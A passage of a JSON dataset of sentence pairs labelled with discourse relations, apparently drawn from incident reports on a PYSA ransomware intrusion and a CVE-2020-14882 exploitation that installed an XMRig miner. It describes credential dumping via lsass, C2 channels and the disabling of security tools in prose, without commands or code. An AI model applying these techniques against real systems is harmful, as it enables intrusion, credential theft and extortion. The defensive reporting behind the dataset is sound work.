        "S2": "RDP was initiated from the beachhead host to a domain controller using the valid account they had used to gain access to the first host.",
        "relation": "ELABORATION"
    },
    {
        "S1": "RDP was initiated from the beachhead host to a domain controller using the valid account they had used to gain access to the first host.",
        "S2": "RDP continued to be the first method of choice while accessing various systems around the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "RDP continued to be the first method of choice while accessing various systems around the environment.",
        "S2": "After a few hours in, the threat actors decided to automate some credential collection and used PsExec to execute a PowerShell script that called comsvcs.dll for lsass dumping.",
        "relation": "NEXT"
    },
    {
        "S1": "After a few hours in, the threat actors decided to automate some credential collection and used PsExec to execute a PowerShell script that called comsvcs.dll for lsass dumping.",
        "S2": "The threat actors used 3 different C2 channels, RDP, PowerShell Empire, and Koadic.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors used 3 different C2 channels, RDP, PowerShell Empire, and Koadic.",
        "S2": "IP\u2019s used to maintain access over RDP",
        "relation": "MISC"
    },
    {
        "S1": "IP\u2019s used to maintain access over RDP",
        "S2": "While no plain text exfiltration was seen during this intrusion, canary documents were opened by the threat actors hours after the ransom, confirming that the hours spent on network before ransoming was used to gather files.",
        "relation": "MISC"
    },
    {
        "S1": "While no plain text exfiltration was seen during this intrusion, canary documents were opened by the threat actors hours after the ransom, confirming that the hours spent on network before ransoming was used to gather files.",
        "S2": "The source IP\u2019s from these canary documents were also Tor exit nodes just like the RDP connections.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The source IP\u2019s from these canary documents were also Tor exit nodes just like the RDP connections.",
        "S2": "Since no plaintext exfil was observed we assess that the exfiltration was performed via one of the command and control channels either RDP, Empire, or Koadic.",
        "relation": "MISC"
    },
    {
        "S1": "Since no plaintext exfil was observed we assess that the exfiltration was performed via one of the command and control channels either RDP, Empire, or Koadic.",
        "S2": "Around the 7.5 hour mark the threat actors began ransom deployment.",
        "relation": "NEXT"
    },
    {
        "S1": "Around the 7.5 hour mark the threat actors began ransom deployment.",
        "S2": "Two files were dropped via RDP on each system, a PowerShell script and a PYSA ransomware executable.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Two files were dropped via RDP on each system, a PowerShell script and a PYSA ransomware executable.",
        "S2": "The purpose of the PowerShell script was to disable security tools that might not have been disabled through-out the intrusion.",
        "relation": "NEXT"
    },
    {
        "S1": "The purpose of the PowerShell script was to disable security tools that might not have been disabled through-out the intrusion.",
        "S2": "Additionally, the script would kill many server and database processes allowing encryption of the files that might otherwise be locked by running processes.",
        "relation": "NEXT"
    },
    {
        "S1": "Additionally, the script would kill many server and database processes allowing encryption of the files that might otherwise be locked by running processes.",
        "S2": "Finally, the ransomware exe was executed and the systems ransomed.",
        "relation": "NEXT"
    },
    {
        "S1": "A threat actor exploited CVE-2020-14882 by making a call to the images directory, which allowed them to execute code on the server.",
        "S2": "Using this exploit, they downloaded and executed an xml file, which included a PowerShell command to download and execute a script.",
        "relation": "NEXT"
    },
    {
        "S1": "Using this exploit, they downloaded and executed an xml file, which included a PowerShell command to download and execute a script.",
        "S2": "The script does multiple things, such as download XMRig and its config, rename XMRig to sysupdate, schedule a task for it\u2019s update process, and confirm the miner is running.",
        "relation": "NEXT"
    },
    {
        "S1": "The script does multiple things, such as download XMRig and its config, rename XMRig to sysupdate, schedule a task for it\u2019s update process, and confirm the miner is running.",
        "S2": "The threat actor executed an xml file named wbw hosted at 95.142.39[.]135 by exploiting CVE-2020-14882.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor executed an xml file named wbw hosted at 95.142.39[.]135 by exploiting CVE-2020-14882.",
        "S2": "In the above screenshot, the threat actor executes wbw.xml which then downloads and executes 1.ps1.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the above screenshot, the threat actor executes wbw.xml which then downloads and executes 1.ps1.",
        "S2": "The script starts off by setting parameters, such as the download locations for XMRig and its config.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The script starts off by setting parameters, such as the download locations for XMRig and its config.",
        "S2": "The script then downloads and executes XMRig, renames it to sysupdate and then sets a schedule task, which runs update.ps1.",
        "relation": "NEXT"
    },
    {
        "S1": "The script then downloads and executes XMRig, renames it to sysupdate and then sets a schedule task, which runs update.ps1.",
        "S2": "There was no script located in this directory but we assume one would show up when the miner needed to be updated, if the threat actor still had access.",
        "relation": "ELABORATION"
    },
    {
        "S1": "There was no script located in this directory but we assume one would show up when the miner needed to be updated, if the threat actor still had access.",
        "S2": "The script renamed xmrig.exe to sysupdate in attempt to hide itself.",
        "relation": "NEXT"
    },
    {
        "S1": "The script renamed xmrig.exe to sysupdate in attempt to hide itself.",
        "S2": "The server\u2019s CPU was maxed out at 100% and likely would have caused issues in an enterprise environment.",
        "relation": "NEXT"
    },
    {
        "S1": "The server\u2019s CPU was maxed out at 100% and likely would have caused issues in an enterprise environment.",
        "S2": "At the time of this writing the wallet used for mining barely had anything in it and appears to be dedicated to us.",
        "relation": "NEXT"
    }
]